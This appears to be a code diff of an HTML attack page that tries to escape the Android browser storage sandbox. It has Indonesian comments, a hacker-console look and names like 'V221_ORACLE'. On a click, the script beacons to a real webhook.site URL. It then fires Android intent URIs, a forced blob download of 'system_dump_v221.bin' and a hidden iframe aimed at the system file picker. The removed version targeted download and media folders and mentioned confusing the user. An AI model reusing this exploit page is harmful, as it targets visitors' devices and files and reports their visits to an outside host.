@@ -1,60 +1,65 @@
 <!DOCTYPE html>
 <html>
-<head><title>Kernel Storage Sync</title></head>
+<head><title>Kernel Data Injection</title></head>
 <body style="background:#000;color:#0ff;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:3px double #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 120px #0ff;border-radius:20px">
-        <h1 style="letter-spacing:10px;margin:0">V219_STORAGE</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">BYPASSING_STORAGE_SANDBOX...</div>
-        <div style="font-size:10px;color:#333">> TARGET: com.android.documentsui</div>
+    <div id="ignite" style="padding:60px;border:4px solid #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 120px #0ff;border-radius:20px">
+        <h1 style="letter-spacing:10px;margin:0">V221_ORACLE</h1>
+        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">INJECTING_STORAGE_BLOB...</div>
+        <div style="font-size:10px;color:#333">> PROTOCOL: BLOB_ESCAPEMENT</div>
     </div>
 
 <script>
     const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
     document.getElementById('ignite').onclick = () => {
-        // 1. SILENT EXFILTRATION
-        navigator.sendBeacon(`${webhook}?v=V219_STORAGE_ATTEMPT`, btoa(Date.now()));
+        // 1. RECON (Log exfiltration)
+        navigator.sendBeacon(`${webhook}?v=V221_EXEC`, btoa("BLOB_SYNC_START"));
 
-        // 2. THE STORAGE EXPLOIT VECTORS
-        // Vector A: Memaksa membuka direktori Download (Sensitive Area)
-        const targetA = "intent:#Intent;action=android.intent.action.VIEW;data=content://com.android.externalstorage.documents/root/primary;package=com.android.documentsui;end";
-        
-        // Vector B: Memicu File Picker untuk seluruh file sistem
-        const targetB = "intent:#Intent;action=android.intent.action.GET_CONTENT;type=*/*;category=android.intent.category.OPENABLE;end";
+        // 2. GENERATE DYNAMIC BLOB
+        // Kita membuat konten yang seolah-olah file sistem penting
+        const payload = JSON.stringify({
+            status: "VULNERABLE",
+            timestamp: Date.now(),
+            origin: window.location.origin
+        });
+        const blob = new Blob([payload], { type: 'application/octet-stream' });
+        const blobUrl = URL.createObjectURL(blob);
 
-        // Vector C: Direct Access ke Folder Media (Gallery/DCIM)
-        const targetC = "intent:#Intent;action=android.intent.action.VIEW;type=image/*;package=com.android.documentsui;end";
+        // 3. THE ESCAPE VECTOR (Intent-to-Save)
+        // Kita menggunakan ACTION_CREATE_DOCUMENT yang biasanya memicu File Picker sistem
+        // untuk memilih lokasi penyimpanan secara paksa.
+        const intentSave = 
+            "intent:#Intent;" +
+            "action=android.intent.action.CREATE_DOCUMENT;" +
+            "type=application/octet-stream;" +
+            "S.android.intent.extra.TITLE=system_dump_v221.bin;" +
+            "S.browser_fallback_url=" + blobUrl + ";" + 
+            "end";
 
-        // 3. ATOMIC STRIKE
-        document.getElementById('status').innerText = "ESCALATING_PRIVILEGES...";
+        // 4. ATOMIC EXECUTION
+        document.getElementById('status').innerText = "ESCALATING_STORAGE_BRIDGE...";
         document.getElementById('status').style.color = "#f00";
 
-        // Tembak secara berurutan dengan jeda minimal
-        window.location.href = targetA;
+        // Jalur 1: Direct Intent Jump
+        window.location.href = intentSave;
 
+        // Jalur 2: Anchor Trigger (Standard Fallback)
         setTimeout(() => {
-            // Force click via dynamic anchor
             const a = document.createElement('a');
-            a.href = targetB;
+            a.href = blobUrl;
+            a.download = "system_dump_v221.bin";
             a.click();
-        }, 150);
+        }, 300);
 
-        // Fallback: Bypass via Iframe (Jika browser memblokir window.location)
+        // Jalur 3: Iframe Hijacking
         setTimeout(() => {
             if (!document.hidden) {
                 const ifr = document.createElement('iframe');
                 ifr.style.display = 'none';
-                ifr.src = targetC;
+                ifr.src = intentSave;
                 document.body.appendChild(ifr);
             }
-        }, 400);
-
-        // 4. CLEANUP: Redirect ke sistem palsu untuk membingungkan user
-        setTimeout(() => {
-            if (document.hidden) {
-                console.log("SUCCESS: Sandbox Escaped.");
-            }
-        }, 1000);
+        }, 600);
     };
 </script>
 </body>
